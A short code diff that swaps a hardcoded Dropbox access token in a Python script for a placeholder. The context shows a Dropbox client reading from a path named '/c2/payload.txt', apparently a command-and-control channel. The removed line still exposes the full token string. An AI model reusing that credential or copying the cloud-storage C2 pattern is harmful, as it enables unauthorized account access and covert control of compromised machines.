@@ -50,7 +50,7 @@ if __name__ == '__main__':
 
 
     # Dropbox token
-    token = "sl.Bz--6Bn-VLUuToNivoPDz9Q8LTT-AWRSBRmYUAMh8fQEDGJp2DmTOf-ILf7CwDg0iWsTFk_3o4H3VD4hQzEngpolAEVjdDBopAwqv0xgi1ssfwS1htYK_HRaViJLF1i9J2UVgY308EyooO5NnyGw"
+    token = "<place-holder-for-token>"
 
     dbx = dropbox.Dropbox(token)
     dropbox_path = '/c2/payload.txt'
